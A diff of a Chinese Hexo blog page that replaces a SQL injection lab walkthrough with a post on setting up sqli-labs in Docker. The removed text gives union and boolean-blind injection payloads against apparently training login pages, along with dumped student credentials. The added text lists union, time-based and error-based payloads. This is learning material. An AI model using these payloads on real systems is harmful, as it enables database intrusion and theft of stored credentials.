@@ -6,24 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://kriller.me">
-  <title>联合注入攻击 | Hexo</title>
+  <title>sql注入学习1 | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="任务1——对http:&#x2F;&#x2F;yun.xxxxx.com:40008&#x2F;login.html进行联合注入攻击步骤如下：  判断注入点是否存在 判断字段 判断输出位置 爆库名 爆表名 爆字段名 获取students表中的数据">
+  <meta name="description" content="了解mysql常用内置函数 mysql5.7  使用docker搭建sqli-labs实验环境 docker search sqli-labs docker pull acgpiano&#x2F;sqli-labs docker images  可以看到这确实存在我们刚刚拉取得image 接着运行这个镜像： docker run -dt --name sqli -p 80:80 --rm  acgpian">
 <meta property="og:type" content="article">
-<meta property="og:title" content="联合注入攻击">
-<meta property="og:url" content="http://kriller.me/2020/11/21/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
+<meta property="og:title" content="sql注入学习1">
+<meta property="og:url" content="http://kriller.me/2020/12/20/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A01/">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="任务1——对http:&#x2F;&#x2F;yun.xxxxx.com:40008&#x2F;login.html进行联合注入攻击步骤如下：  判断注入点是否存在 判断字段 判断输出位置 爆库名 爆表名 爆字段名 获取students表中的数据">
+<meta property="og:description" content="了解mysql常用内置函数 mysql5.7  使用docker搭建sqli-labs实验环境 docker search sqli-labs docker pull acgpiano&#x2F;sqli-labs docker images  可以看到这确实存在我们刚刚拉取得image 接着运行这个镜像： docker run -dt --name sqli -p 80:80 --rm  acgpian">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-11-21T13:54:57.828Z">
-<meta property="article:modified_time" content="2020-11-21T13:54:28.010Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220152931478.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220153139630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220153322826.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220154225950.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/20202020image-20201220153732928.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220154655229.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220160007610.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220161224857.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220163349104.png">
+<meta property="article:published_time" content="2020-12-20T15:20:50.636Z">
+<meta property="article:modified_time" content="2020-12-20T15:20:50.809Z">
 <meta property="article:author" content="麦芽糖吖">
-<meta property="article:tag" content="漏洞复现">
-<meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220152931478.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -227,14 +235,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-联合注入攻击" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sql注入学习1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      联合注入攻击
+      sql注入学习1
     </h1>
   
 
@@ -246,8 +254,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2020/11/21/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="archive-article-date">
-        <time datetime="2020-11-21T13:54:57.828Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-21</time>
+<a href="/2020/12/20/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A01/" class="archive-article-date">
+        <time datetime="2020-12-20T15:20:50.636Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-20</time>
 </a>
 
   
@@ -260,7 +268,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.2k字</span>
+      <span class="post-count">298字</span>
     </span>
   </span>
 
@@ -269,7 +277,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">5分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -280,98 +288,41 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="任务1——对http-yun-xxxxx-com-40008-login-html进行联合注入攻击"><a href="#任务1——对http-yun-xxxxx-com-40008-login-html进行联合注入攻击" class="headerlink" title="任务1——对http://yun.xxxxx.com:40008/login.html进行联合注入攻击"></a>任务1——对<a target="_blank" rel="noopener" href="http://yun.xxxxx.com:40008/login.html%E8%BF%9B%E8%A1%8C%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">http://yun.xxxxx.com:40008/login.html进行联合注入攻击</a></h1><p>步骤如下：</p>
-<ul>
-<li>判断注入点是否存在</li>
-<li>判断字段</li>
-<li>判断输出位置</li>
-<li>爆库名</li>
-<li>爆表名</li>
-<li>爆字段名</li>
-<li>获取students表中的数据</li>
-</ul>
+    <ol>
+<li><p>了解mysql常用内置函数</p>
+<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html">mysql5.7</a></p>
+</li>
+<li><p>使用docker搭建sqli-labs实验环境</p>
+<p><code>docker search sqli-labs</code></p>
+<p><code>docker pull acgpiano/sqli-labs</code></p>
+<p><code>docker images</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220152931478.png" alt="image-20201220152931478"></p>
+<p>可以看到这确实存在我们刚刚拉取得image</p>
+<p>接着运行这个镜像：</p>
+<p><code>docker run -dt --name sqli -p 80:80 --rm  </code>acgpiano/sqli-labs`</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220153139630.png" alt="image-20201220153139630"></p>
+<p>启动成功。输入本机ip加端口80查看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220153322826.png" alt="image-20201220153322826"></p>
+<p>接下来可以开始愉快的玩耍了。</p>
+</li>
+</ol>
 <a id="more"></a>
 
-<h2 id="1-判断注入点是否存在"><a href="#1-判断注入点是否存在" class="headerlink" title="1.判断注入点是否存在"></a>1.判断注入点是否存在</h2><pre><code>步骤如下：
-    1.在用户名栏输入1&#39;                // 报数据库查询出错
-    2.在用户名栏输入1&#39; or 1=1 --     // 正常登陆
-    3.在用户名栏输入1&#39; or 1=2 --    // 出错
-由此判断该处user参数为注入点</code></pre>
-<h2 id="2-判断字段"><a href="#2-判断字段" class="headerlink" title="2.判断字段"></a>2.判断字段</h2><pre><code>步骤如下：
-    1.在用户名栏输入1&#39; or 1=1 order by 1 --     //登陆成功
-    2.在用户名栏输入1&#39; or 1=1 order by 2 --        //登陆成功
-    3.在用户名栏输入1&#39; or 1=1 order by 3 --        //登陆成功
-    4.在用户名栏输入1&#39; or 1=1 order by 4 --        //报数据库查询出错
-由此判断字段数为3</code></pre>
-<h2 id="3-判断输出位置"><a href="#3-判断输出位置" class="headerlink" title="3.判断输出位置"></a>3.判断输出位置</h2><pre><code>步骤如下：
-    1.在用户名栏输入1&#39;  union select 1,2,3 -- //页面输出一个二
-由此判断输出位置为2</code></pre>
-<h2 id="4-爆库名"><a href="#4-爆库名" class="headerlink" title="4.爆库名"></a>4.爆库名</h2><pre><code>步骤如下：
-    1.在用户名栏输入1&#39; union select 1,database(),3 -- //输出数据库名为grade
-*******************************************************************************
-*******************************************************************************
-*******************************************************************************
-以下步骤因为输入框存在输入长度限制，且http请求方式为post方式，因此使用了火狐插件tamperdata进行抓包以及修改post请求参数。</code></pre>
-<h2 id="5-爆表名"><a href="#5-爆表名" class="headerlink" title="5.爆表名"></a>5.爆表名</h2><pre><code>步骤如下：
-    1.在tamperdata输入1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;grade&#39;),3-- 
-    //成功爆出表名为admins,classes,english,networks,students,teachers</code></pre>
-<h2 id="6-爆字段名"><a href="#6-爆字段名" class="headerlink" title="6.爆字段名"></a>6.爆字段名</h2><pre><code>步骤如下：
-    1.在tamperdata输入1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;students&#39;),3--     
-    //成功爆出字段名为id,name,pass</code></pre>
-<h2 id="7-获取students表中的数据"><a href="#7-获取students表中的数据" class="headerlink" title="7.获取students表中的数据"></a>7.获取students表中的数据</h2><pre><code>步骤如下：
-    1.在tamperdata输入1&#39; union select 1,(select group_concat(id,name,pass) from grade.students),3 -- 
-    //成功爆出数据为
-    3001yizyi001,
-    3002erzer002,
-    3003sanzsan003,
-    3004sizsi004,
-    3005wuzwu005,
-    3006liuzliu006,
-    3007qizqi007,
-    3008bazba008,
-    3009jiuzjiu009,
-    3010shizshi010</code></pre>
-<h1 id="拓展任务——对http-yun-zhiliaotang-com-40006-userlogin-php-进行sql盲注（基于布尔的盲注）"><a href="#拓展任务——对http-yun-zhiliaotang-com-40006-userlogin-php-进行sql盲注（基于布尔的盲注）" class="headerlink" title="拓展任务——对http://yun.zhiliaotang.com:40006/userlogin.php 进行sql盲注（基于布尔的盲注）"></a>拓展任务——对<a target="_blank" rel="noopener" href="http://yun.zhiliaotang.com:40006/userlogin.php">http://yun.zhiliaotang.com:40006/userlogin.php</a> 进行sql盲注（基于布尔的盲注）</h1><p>步骤如下：</p>
-<h2 id="1-判断注入点是否存在，是字符型还是数字型"><a href="#1-判断注入点是否存在，是字符型还是数字型" class="headerlink" title="1.判断注入点是否存在，是字符型还是数字型"></a>1.判断注入点是否存在，是字符型还是数字型</h2><pre><code>步骤如下：
-1.在用户名栏输入1&#39;                            //提示登陆失败
-2.在用户名栏输入1&#39; or 1=1#                    //登陆成功
-3.在用户名栏输入1&#39; or 1=2#                    //提示登陆失败
-由此判断该处存在典型的sql盲注，且是字符型。</code></pre>
-<h2 id="2-猜解当前数据库名称长度"><a href="#2-猜解当前数据库名称长度" class="headerlink" title="2.猜解当前数据库名称长度"></a>2.猜解当前数据库名称长度</h2><pre><code>步骤如下：
-1.在用户名栏输入1&#39; or length(database())=1 #
-2.在用户名栏输入1&#39; or length(database())=2 #
-3.在用户名栏输入1&#39; or length(database())=3 #
-4.在用户名栏输入1&#39; or length(database())=4 #
-                `
-        登陆    `    失败
-                `
-                `
-9.在用户名栏输入1&#39; or length(database())=9 #    登陆成功
-由此判断当前数据库名称长度为9.</code></pre>
-<h2 id="3-猜解当前数据库名（这里采用二分法猜解数据库名）"><a href="#3-猜解当前数据库名（这里采用二分法猜解数据库名）" class="headerlink" title="3.猜解当前数据库名（这里采用二分法猜解数据库名）"></a>3.猜解当前数据库名（这里采用二分法猜解数据库名）</h2><pre><code>1.在用户名栏输入1&#39; or ascii(substr(database(),1,1))&gt;97#    登陆成功
-2.在用户名栏输入1&#39; or ascii(substr(database(),1,1))&lt;97#    登陆失败
-3.在用户名栏输入1&#39; or ascii(substr(database(),1,1))&gt;110#登陆失败
-4.在用户名栏输入1&#39; or ascii(substr(database(),1,1))&lt;110#登陆成功
-5.在用户名栏输入1&#39; or ascii(substr(database(),1,1))&gt;103#登陆失败
-6.在用户名栏输入1&#39; or ascii(substr(database(),1,1))&lt;103#登陆失败
-说明当前数据库的第一个字母为g
-重复上述步骤可以获取到完整的数据库名称为guestbook
-*******************************************************************************
-*******************************************************************************
-*******************************************************************************
-以下步骤因为输入框存在输入长度限制，且http请求方式为post方式，因此使用了火狐插件tamperdata进行抓包以及修改post请求参数。</code></pre>
-<h2 id="4-猜解数据库中的表名"><a href="#4-猜解数据库中的表名" class="headerlink" title="4.猜解数据库中的表名"></a>4.猜解数据库中的表名</h2><pre><code>4.1首先猜解数据库中表的数量：
-    4.1.1.在用户名栏输入1’ or (select count (table_name) from information_schema.tables where table_schema=database())=1 # //登陆失败
-    4.1.2.在用户名栏输入1’ or (select count (table_name) from information_schema.tables where table_schema=database())=1 # //登陆成功
-    说明当前数据库有两个表
-4.2接着猜解每个表的名称（任然使用二分法）
-    4.2.1.猜解表的表长度
-        1).在用户名栏输入1’ or length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1# 登陆失败
-        重复上述步骤，获得表的长度为7和4
-    4.2.2.猜解表名（二分法）
-        1).在用户名栏输入1’ or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 #登陆成功
-        重复上述步骤可以获取到完整的表名为message和user</code></pre>
-<h2 id="5-猜解表中的字段名"><a href="#5-猜解表中的字段名" class="headerlink" title="5.猜解表中的字段名"></a>5.猜解表中的字段名</h2><pre><code>和猜解表明类似，不再赘述。</code></pre>
+<p>这些都做完后，就开始了解常用的sql函数。没有输出就等于没学，所以鼓励大家一起动手试试：</p>
+<p>首先进入到你的容器中，启动mysql。先查看一下当前数据库中得所有数据库：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220154225950.png" alt="image-20201220154225950"></p>
+<p>然后进行以上这些函数的练习：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/20202020image-20201220153732928.png" alt="image-20201220153732928"></p>
+<p>给出部分练习截图。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220154655229.png" alt="image-20201220154655229"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220160007610.png" alt="image-20201220160007610"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220161224857.png" alt="image-20201220161224857"></p>
+<p>这些都做好后，就可以继续接下来得sql注入学习啦。</p>
+<p>如果这些能独立搞懂，就已经很不错了，对于之后学习会很有帮助。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201220163349104.png" alt="image-20201220163349104"></p>
+<p>最后把这些整理下，方便之后使用时间盲注和报错注入得学习。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() regexp <span class="string">&#x27;^ro&#x27;</span></span><br><span class="line"><span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))</span><br><span class="line">updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
 
     
 
@@ -418,7 +369,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://kriller.me/2020/11/21/联合注入攻击/" title="联合注入攻击" target="_blank">http://kriller.me/2020/11/21/联合注入攻击/</a>
+          <a href="http://kriller.me/2020/12/20/sql注入学习1/" title="sql注入学习1" target="_blank">http://kriller.me/2020/12/20/sql注入学习1/</a>
         </li>
         
         <li>
@@ -440,15 +391,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">WEB安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
         		</li>
       		
 		</ul>
@@ -515,7 +458,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://kriller.me/2020/11/21/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://kriller.me/2020/12/20/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A01/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -530,18 +473,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2020/11/24/kali%E5%AE%89%E8%A3%85/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          图形化安装Kali虚拟机
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/11/21/kali-linux%E4%B8%8B%E5%AE%89%E8%A3%85pocsuite3%E5%AE%9E%E6%88%98docker%E6%90%AD%E5%BB%BA%E7%9A%84ThinkPHP%205.0,5.1%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">kali安装pocsuite3实战ThinkPHP远程代码执行</div>
+    <a href="/2020/12/16/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E7%BB%B4%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">学习笔记（5号黯区）</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -568,7 +502,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A11%E2%80%94%E2%80%94%E5%AF%B9http-yun-xxxxx-com-40008-login-html%E8%BF%9B%E8%A1%8C%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">任务1——对http:&#x2F;&#x2F;yun.xxxxx.com:40008&#x2F;login.html进行联合注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">1.1.</span> <span class="toc-text">1.判断注入点是否存在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">2.判断字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E8%BE%93%E5%87%BA%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.</span> <span class="toc-text">3.判断输出位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">1.4.</span> <span class="toc-text">4.爆库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.5.</span> <span class="toc-text">5.爆表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.6.</span> <span class="toc-text">6.爆字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E8%8E%B7%E5%8F%96students%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">1.7.</span> <span class="toc-text">7.获取students表中的数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E4%BB%BB%E5%8A%A1%E2%80%94%E2%80%94%E5%AF%B9http-yun-zhiliaotang-com-40006-userlogin-php-%E8%BF%9B%E8%A1%8Csql%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">拓展任务——对http:&#x2F;&#x2F;yun.zhiliaotang.com:40006&#x2F;userlogin.php 进行sql盲注（基于布尔的盲注）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%EF%BC%8C%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1.判断注入点是否存在，是字符型还是数字型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%8C%9C%E8%A7%A3%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E9%95%BF%E5%BA%A6"><span class="toc-number">2.2.</span> <span class="toc-text">2.猜解当前数据库名称长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%8C%9C%E8%A7%A3%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%88%E8%BF%99%E9%87%8C%E9%87%87%E7%94%A8%E4%BA%8C%E5%88%86%E6%B3%95%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">3.猜解当前数据库名（这里采用二分法猜解数据库名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">2.4.</span> <span class="toc-text">4.猜解数据库中的表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%8C%9C%E8%A7%A3%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">5.猜解表中的字段名</span></a></li></ol></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
